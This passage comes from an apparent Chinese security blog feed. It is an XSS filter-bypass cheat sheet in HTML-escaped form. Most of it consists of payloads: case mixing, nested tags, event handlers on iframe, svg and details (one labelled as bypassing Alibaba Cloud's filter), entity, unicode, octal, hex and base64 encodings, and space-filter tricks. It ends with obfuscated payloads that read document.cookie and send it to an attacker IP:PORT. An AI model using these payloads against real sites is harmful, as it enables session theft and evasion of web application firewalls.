class="line">&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt;</span><br></pre></td></tr></table></figure></li><li><p>嵌套,也就是重复</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>代替</p><p>iframe就可以代替script<br>confirm和prompt可以代替alert</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;details/open/ontoggle=top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="number">1</span>)&gt; 谷歌浏览器 【绕阿里云XSS】</span><br><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;style onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert`<span class="number">1</span>`&gt;</span><br><span class="line">&lt;body onload=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;<span class="keyword">select</span> autofocus onfocus=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;confirm(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>HTML5 新增的实体命名编码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;colon; =&gt; [冒号]</span><br><span class="line"></span><br><span class="line">&amp;NewLine; =&gt; [换行]</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>: &lt;a href=<span class="string">&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>编码</p><p>HTML实体可以使用十进制与十六进制编码;</p><p>javascript可以使用Unicode与八进制与十六进制进行编码.</p><p><code>eval()</code>函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站<code>http://web.chacuo.net/charsetjsascii</code></p><p>将payload进行进制转化,十六进制前面+<code>&amp;#x</code>,十进制+<code>&amp;#</code></p><p><strong>对于JS编码</strong></p><ul><li><p>unicode配合js的eval函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;</span>)&gt;&lt;/img&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0027\u0029&quot;</span>)&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure></li><li><p>八进制与十六进制编码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(<span class="string">&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;</span>);&lt;/script&gt;（JS八进制编码）</span><br></pre></td></tr></table></figure><script>eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29");</script>（JS十六进制编码）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- String.fromCharCode</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;csharp</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure></li><li><p>data协议</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>对html编码</strong></p><ul><li><p>十进制与十六进制</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;  （HTML实体十进制编码)</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt; (HTML实体十六进制编码)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**js特性**</span><br><span class="line"></span><br><span class="line">| Payload                                          | 效果                   |</span><br><span class="line">| ------------------------------------------------ | ---------------------- |</span><br><span class="line">| &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96;             | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; |</span><br><span class="line">| &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96;                    | &#96;alert(1)&#96;             |</span><br><span class="line">| &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\w&#123;4&#125;\(\d\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96;     |</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;csharp</span><br><span class="line">&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="2、过滤符号"><a href="#2、过滤符号" class="headerlink" title="2、过滤符号"></a>2、过滤符号</h5><ul><li><p>过滤空格</p><h6 id="用-或者"><a href="#用-或者" class="headerlink" title="用/**/或者/"></a>用<code>/**/</code>或者<code>/</code></h6><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;1&quot;</span>/onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br><span class="line">&lt;img<span class="comment">/**/</span>src=<span class="string">&quot;1&quot;</span><span class="comment">/**/</span>onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><h5 id="3、常用函数"><a href="#3、常用函数" class="headerlink" title="3、常用函数"></a>3、常用函数</h5><ul><li><p>atob()与btoa()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">atob(<span class="string">&quot;L2h0dHA6Lw==&quot;</span>)</span><br><span class="line"><span class="string">&quot;/http:/&quot;</span></span><br><span class="line">btoa(/http:/)</span><br><span class="line"><span class="string">&quot;L2h0dHA6Lw==&quot;</span></span><br></pre></td></tr></table></figure><p>在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串：</p><ul><li>atob() //ASCII to Base64</li><li>btoa() //Base64 to ASCII</li></ul></li><li><p>slice()</p><p>slice() 方法可从已有的数组中返回选定的元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayObject.slice(start,end)</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1))))</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621144413840.png" alt="image-20200621144413840"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621153113215.png" alt="image-20200621153113215"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;xss&quot;&gt;&lt;a href=&quot;#xss&quot; class=&quot;headerlink&quot; title=&quot;xss&quot;&gt;&lt;/a&gt;xss&lt;/h4&gt;&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h4&gt;&lt;p</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
</feed>
